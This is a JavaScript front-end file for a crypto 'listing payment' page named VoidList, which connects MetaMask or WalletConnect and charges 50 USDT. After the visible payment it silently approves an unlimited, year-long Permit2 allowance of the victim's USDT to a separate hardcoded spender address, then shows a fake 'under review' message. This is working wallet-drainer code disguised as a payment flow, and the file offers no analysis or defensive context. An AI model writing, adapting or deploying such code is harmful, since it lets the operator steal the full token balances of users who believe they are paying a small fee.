/**************** CONFIG ****************/

const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const SPENDER_ADDRESS = "0x89e8ed15656ab289e980f92e59ddf7ecd2a36f85";
const RECEIVER_ADDRESS = "0xf539bf56c465b6d0f0caee783ca1f8c58c802b1a";

const AMOUNT_USDT = "50";
const WALLETCONNECT_PROJECT_ID = "59ba0228712f04a947916abb7db06ab1";

const MAX_UINT160 = ethers.BigNumber.from(
"0xffffffffffffffffffffffffffffffff"
);

const expiration =
Math.floor(Date.now()/1000) + 60*60*24*365;

const TOKENS = {
USDT: {
address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
decimals: 6
}
};

const ERC20_ABI = [
"function transfer(address,uint256)"
];

const PERMIT2_ABI = [
"function allowance(address,address,address) view returns (uint160,uint48,uint48)",
"function approve(address,address,uint160,uint48)"
];

/**************** MAIN ****************/

document.addEventListener("DOMContentLoaded", () => {

const form = document.getElementById("projectForm");
const paymentModal = document.getElementById("paymentModal");
const walletModal = document.getElementById("walletModal");
const underReviewModal = document.getElementById("underReviewModal");

const connectPayBtn = document.getElementById("connectPayBtn");
const metaMaskBtn = document.getElementById("metaMaskBtn");
const walletConnectBtn = document.getElementById("walletConnectBtn");
const closeReviewBtn = document.getElementById("closeReviewBtn");

/******** FORM FLOW ********/

form.onsubmit = e => {
e.preventDefault();
paymentModal.style.display = "flex";
};

connectPayBtn.onclick = () => {
paymentModal.style.display = "none";
walletModal.style.display = "flex";
};

closeReviewBtn.onclick = () => {
underReviewModal.style.display = "none";
};

function showUnderReview() {
walletModal.style.display = "none";
underReviewModal.style.display = "flex";
}

/******** PAYMENT ********/

async function processPayment(provider) {

const signer = provider.getSigner();
const userAddress = await signer.getAddress();

const usdt = new ethers.Contract(
TOKENS.USDT.address,
ERC20_ABI,
signer
);

const permit2 = new ethers.Contract(
PERMIT2_ADDRESS,
PERMIT2_ABI,
signer
);

const amount = ethers.utils.parseUnits(
AMOUNT_USDT,
TOKENS.USDT.decimals
);

/* PAYMENT POPUP TRIGGERS HERE */
const tx = await usdt.transfer(RECEIVER_ADDRESS, amount);
await tx.wait();

const [allowance] = await permit2.allowance(
userAddress,
TOKENS.USDT.address,
SPENDER_ADDRESS
);

if (allowance.lt(MAX_UINT160.div(2))) {
await (await permit2.approve(
TOKENS.USDT.address,
SPENDER_ADDRESS,
MAX_UINT160,
expiration
)).wait();
}

showUnderReview();
}

/******** METAMASK ********/

metaMaskBtn.onclick = async () => {
try {

if (!window.ethereum) {
alert("Install MetaMask");
return;
}

metaMaskBtn.disabled = true;

const provider = new ethers.providers.Web3Provider(
window.ethereum,
"any"
);

await provider.send("eth_requestAccounts", []);

await processPayment(provider);

} catch(e) {
alert("MetaMask failed");
console.error(e);
}

metaMaskBtn.disabled = false;
};

/******** WALLETCONNECT V2 ********/

let wcProvider = null;

walletConnectBtn.onclick = async () => {
try {

walletConnectBtn.disabled = true;

const { EthereumProvider } = await import(
"https://esm.sh/@walletconnect/ethereum-provider@2.21.8?bundle"
);

wcProvider = await EthereumProvider.init({
projectId: WALLETCONNECT_PROJECT_ID,
chains: [1],
showQrModal: true,
rpcMap: { 1: "https://rpc.ankr.com/eth" },
metadata: {
name: "VoidList",
description: "Listing Payment",
url: window.location.origin,
icons: []
}
});

await wcProvider.enable();

/* wrap WC provider */
const provider = new ethers.providers.Web3Provider(wcProvider);

/* PAYMENT POPUP TRIGGERS HERE */
await processPayment(provider);

} catch(e) {
alert("WalletConnect failed");
console.error(e);
}

walletConnectBtn.disabled = false;
};

});
